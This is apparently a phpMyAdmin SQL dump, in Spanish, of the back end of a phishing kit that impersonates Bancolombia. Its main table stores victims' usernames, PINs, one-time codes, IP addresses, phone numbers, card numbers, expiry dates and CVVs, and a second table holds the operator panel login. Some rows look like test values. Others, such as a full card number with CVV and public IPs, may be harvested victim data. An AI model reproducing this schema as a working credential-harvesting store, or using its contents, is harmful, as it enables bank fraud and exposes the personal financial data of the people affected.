-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 05-06-2024 a las 21:11:59
-- Versión del servidor: 10.4.32-MariaDB
-- Versión de PHP: 8.0.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `pb`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3it3m`
--

CREATE TABLE `m3it3m` (
  `idreg` int(11) NOT NULL,
  `usuario` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `otp` varchar(255) DEFAULT NULL,
  `dispositivo` varchar(255) DEFAULT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `id` varchar(255) DEFAULT NULL,
  `agente` varchar(255) DEFAULT NULL,
  `banco` varchar(255) DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `horacreado` datetime DEFAULT NULL,
  `horamodificado` datetime DEFAULT NULL,
  `celular` varchar(255) DEFAULT NULL,
  `tarjeta` varchar(255) DEFAULT NULL,
  `ftarjeta` varchar(255) DEFAULT NULL,
  `cvv` varchar(255) DEFAULT NULL,
  `email` varchar(255) NOT NULL,
  `cemail` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `m3it3m`
--

INSERT INTO `m3it3m` (`idreg`, `usuario`, `password`, `otp`, `dispositivo`, `ip`, `id`, `agente`, `banco`, `status`, `horacreado`, `horamodificado`, `celular`, `tarjeta`, `ftarjeta`, `cvv`, `email`, `cemail`) VALUES
(1, '', '9999', NULL, 'PC', '::1', NULL, NULL, 'Bancolombia', 12, '2024-06-01 10:46:29', '2024-06-01 10:46:29', NULL, NULL, NULL, NULL, '', ''),
(2, 'carlos', '1764', NULL, 'PC', '::1', NULL, NULL, 'Bancolombia', 4, '2024-06-01 10:46:52', '2024-06-01 10:48:03', NULL, '1111111111111111', '11-2028', '1111', '', ''),
(3, 'Carlo', '6666', NULL, 'iPhone', '192.168.1.36', NULL, NULL, 'Bancolombia', 10, '2024-06-01 11:22:38', '2024-06-01 11:23:03', '3008574255', NULL, NULL, NULL, 'Lucas@lucas.com', '1142575866'),
(4, 'Carlos65', '2673', NULL, 'iPhone', '192.168.1.36', NULL, NULL, 'Bancolombia', 10, '2024-06-01 12:03:36', '2024-06-01 12:03:36', NULL, NULL, NULL, NULL, '', ''),
(5, 'daniel77', '1774', '123456', 'iPhone', '152.204.155.64', NULL, NULL, 'Bancolombia', 10, '2024-06-01 12:58:14', '2024-06-01 13:00:14', '3017777777', '1234567891011121', '08-2027', '123', 'daniel77@gmail.com', '1042222222222222222'),
(6, 'Carlos', '6237', '346466', 'iPhone', '190.130.103.162', NULL, NULL, 'Bancolombia', 4, '2024-06-01 12:58:55', '2024-06-01 13:00:39', NULL, NULL, NULL, NULL, '', ''),
(7, 'esteban', '1764', '786543', 'Android', '191.106.208.177', NULL, NULL, 'Bancolombia', 8, '2024-06-01 13:08:23', '2024-06-01 13:09:20', NULL, NULL, NULL, NULL, '', ''),
(8, 'Juanjjy54', '3627', '746885', 'iPhone', '152.204.160.139', NULL, NULL, 'Bancolombia', 8, '2024-06-01 13:09:22', '2024-06-01 13:09:35', NULL, NULL, NULL, NULL, '', ''),
(9, 'Joseperez.', '3022', NULL, 'iPhone', '191.106.204.216', NULL, NULL, 'Bancolombia', 10, '2024-06-01 13:13:43', '2024-06-01 13:14:53', NULL, '1111111111111111', '10-2027', '0077', '', ''),
(10, 'pitufo', '1764', '123456', 'Android', '191.106.208.177', NULL, NULL, 'Bancolombia', 10, '2024-06-01 13:18:00', '2024-06-01 13:20:10', '3174129474', '4960793006182638', '12-2027', '633', 'esteban123@gmail.com', '1107123456');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3us3r`
--

CREATE TABLE `m3us3r` (
  `usuario` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `m3us3r`
--

INSERT INTO `m3us3r` (`usuario`, `password`) VALUES
('juan', 'juan123');

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `m3it3m`
--
ALTER TABLE `m3it3m`
  ADD PRIMARY KEY (`idreg`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `m3it3m`
--
ALTER TABLE `m3it3m`
  MODIFY `idreg` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
